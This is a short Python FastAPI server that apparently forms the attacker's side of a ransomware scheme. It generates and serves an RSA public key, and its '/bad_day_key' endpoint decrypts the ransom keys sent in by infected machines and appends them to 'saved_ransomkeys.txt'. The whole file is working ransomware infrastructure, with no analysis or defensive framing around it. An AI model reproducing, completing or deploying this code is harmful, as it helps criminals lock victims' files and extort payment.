import os

from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from fastapi import FastAPI
from Crypto.PublicKey import RSA
from pydantic import BaseModel

app = FastAPI()


class BadDayKey(BaseModel):
    key: str


def get_saved_key():
    with open("private_key.pem", "rb") as priv_file:
        private_key = RSA.import_key(priv_file.read())
    return private_key


def get_private_key():
    if os.path.exists("private_key.pem"):
        private_key = get_saved_key()
    else:
        private_key = RSA.generate(2048)
        with open("private_key.pem", "wb") as priv_file:
            priv_file.write(private_key.export_key())

    return private_key


@app.get("/key")
def get_public_key():
    private_key = get_private_key()
    return {"key": private_key.publickey().export_key().decode()}


@app.post("/bad_day_key")
def save_ransom_key(key: BadDayKey):
    cipher_rsa = PKCS1_OAEP.new(get_private_key())
    decrypted_ransomkey = cipher_rsa.decrypt(bytes.fromhex(key.key))

    with open("saved_ransomkeys.txt", "a") as f:
        f.write("ransom_key: " + decrypted_ransomkey.hex() + "\n")

    return {"status": "success"}
